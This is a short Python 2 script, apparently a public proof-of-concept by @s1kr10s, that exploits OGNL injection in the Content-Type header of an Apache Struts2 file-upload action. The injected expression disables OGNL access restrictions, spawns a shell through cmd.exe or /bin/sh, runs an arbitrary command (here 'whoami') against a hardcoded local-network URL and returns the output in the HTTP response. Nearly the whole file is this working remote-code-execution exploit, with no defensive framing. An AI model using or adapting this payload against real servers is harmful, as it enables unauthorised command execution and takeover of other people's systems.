#!/usr/bin/python
#Code By @s1kr10s

import urllib2
import os

RED = '\033[1;31m'
BLUE = '\033[94m'
BOLD = '\033[1m'
GREEN = '\033[32m'
OTRO = '\033[36m'
YELLOW = '\033[33m'
ENDC = '\033[0m'

def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])
cls()

logo = BLUE+'''
        `.``
     `+++++++:`
    `+++++++++,`  :++'`                             .'++`
    ++++,..'++,.  +++'.                             ,+++,`
   `+++.:,.,,::`  +++',                             ,+++:`
   .+++:.`  `..   ++++,                             ,+++:`
   .+++:`       ''+++++++  `'+``+++.`:'+'`  `'++` +'+++++++.   ;+++++,
   `++++.       +++++++++,`'++,++++..+++'.  ,+++,`+++++++++`` ++++++++.`
    +++++'.     ::++++';::`:++++++':.+++'.  ,+++:`:::+++';;,.,+++:::+;:`
    .++++++'`   `,++++:,,. .+++',:,,`+++',  ,+++:``.:+++::,.`+++.:,,,,.
     .;++++++.   `++++,``  `+++:,``` +++'.  ,+++:`  ,+++,.`  +++:.` ```
      .,;+++++.   ++++,    `+++:.    +++',  ,+++:`  ,+++,`   ;++++:
       `.,;+++:`  ++++,    `+++:`    +++'.  ,+++:`  ,+++,`   `++++++;`
         `.++++,  ++++,    `+++:`    +++'.  ,+++:`  ,+++:`    .++++++'`
           :+++,` ++++,    `+++:`    +++'.  ,+++:`  ,+++,`     ..:++++,`
           ;+++,` ++++,`   `+++:`    +++'.  ,+++:`  .+++:`      `.,'++..
    +,`    +++;,  ++++, .  `+++:`    +++',  :+++:`  .+++:``  :`   `;++`.
   `++++++++++..  ;++++++.``+++:`    +++++++++++:`  `++++++``+++;,;+++,.
   ,+++++++++,:`  `++++++..`+++:`    .++++++'+++,`   ++++++:.++++++++::`
    .;++++++`:.    ,+++++`.`'';:`     ,++++`:++,,`   .+++++.,.:+++++;:.
    `.,.`.,:,`     `,,,::,` `,,.`     `.:::,..,,.`    .,,,:,.`.,,.`,,.`
       `````         ``.``              ````  ``       `..``    ``.``  By @s1kr10s
                        -=[Execute command Tools]=-
'''+ENDC
print logo

print " * Usage: www.victima.com/files.login\n\n"
#host = raw_input(BOLD+" [+] HOST con http(s): "+ENDC)
host = "http://192.168.1.128:8080/Struts2FileUpload/doUpload.action"
print "\n"

def exploit(comando):
  exploit = "Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='"+str(comando)+"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'cmd.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}"
  return exploit

separador = "whoami"
req = urllib2.Request(host, None, {'User-agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5', 'Content-Type': exploit(str(separador))})
result = urllib2.urlopen(req).read()
print result